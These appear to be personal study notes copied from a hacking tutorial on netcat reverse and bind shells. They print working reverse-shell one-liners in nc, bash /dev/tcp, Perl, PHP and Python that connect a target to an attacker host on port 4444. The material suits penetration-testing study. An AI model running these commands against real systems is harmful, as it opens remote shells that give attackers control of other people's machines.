
https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/

Access to a shell is, essentially, access to a machine.
"Popping" a shell is to connect to and having access to another machine.
Reverse shell is having the target machine to connect to us, the attacker box (machine).
Bind shell is when the attacker connect to a target which previously offered connection. 

# Reverse Shell

![[Pasted image 20240825142721.png]]

## Netcat reverse shell example

In order to setup a Netcat reverse shell we need to follow the following steps:

1. Setup a Netcat listener.
2. Connect to the Netcat listener from the target host.
3. Issue commands on the target host from the attack box.

First we setup a Netcat listener on the attack box which is listening on port 4444 with the following command:

> `nc –lvp 4444`

Than we issue the following command on the target host to connect to our attack box (remember we have remote code execution on this box):

For Linux:

> `nc 192.168.100.113 4444 –e /bin/bash`

For Windows:

> `nc.exe 192.168.100.113 4444 –e cmd.exe`

On the attack box we now have a bash shell on the target host and we have full control over this box in the context of the account which initiated the reverse shell. In this case the root user initiated the shell which means we have root privileges on the target host.
![Netcat basics - Reverse shel](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-basics-Reverse-shell-5.jpg)

## Reverse shell without Netcat on the target host

One major downside on the shown example is that you need Netcat on that target host which is very often not the case in real world scenario’s. In some cases Netcat is present, or we have a way to install it, but in many cases we need to use alternatives ways to connect back to the attack box. Let’s have a look at a few alternative ways to setup a reverse shell.

### _Bash reverse shell_

With can also use Bash to initiate a reverse shell from the target host to the attack box by using the following command:

> `bash -i >& /dev/tcp/192.168.100.113/4444 0>&1`

![Netcat basics - Reverse shell bash](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-basics-Reverse-shell-bash-6.jpg)

### _Perl reverse shell_

If Perl is present on that remote host we can also initiate a reverse shell using Perl. Run the following command on the target host to setup the reverse shell:

> `perl -e ‘use Socket;$i=”192.168.100.113″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’`

![Netcat basics - Reverse shell perl](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-basics-Reverse-shell-perl-7.jpg)

### _PHP reverse shell_

When PHP is present on the compromised host, which is often the case on webservers, it is a great alternative to Netcat, Perl and Bash. Let’s run the following code to use PHP for the reverse shell to the attack box:

> `php -r ‘$sock=fsockopen(“192.168.100.113”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’`

As we can see this reverse shell one liner also returns a /bin/sh shell.
![PHP reverse shell](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-basics-Reverse-shell-PHP-8.jpg)

### _Python reverse shell_

Python is also a very commonly installed language on Linux machines. The following command issues a reverse shell using Python:

>`python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`

![Python reverse shell](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-basics-Reverse-shell-Python-9.jpg)

# Bind Shell


![[Pasted image 20240825143503.png]]

## Netcat Bind Shell
In this visualization the target binds a Bash shell to port 4444 using a Netcat listener. The attacker connects to this port using a simple Netcat command. The steps to setup a bind shell are as following:

1. Bind a bash shell to port 4444 using Netcat.
2. Connect to the target host on port 4444 from the attack box.
3. Issue commands on the target host from the attack box.

## Netcat Bind shell example

On the console:
![Netcat Bind shell example](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-Bind-shell-example.jpg)

The target host binds a Bash shell to port 4444, than the attack connects to that port using Netcat and gains a root shell on the target.
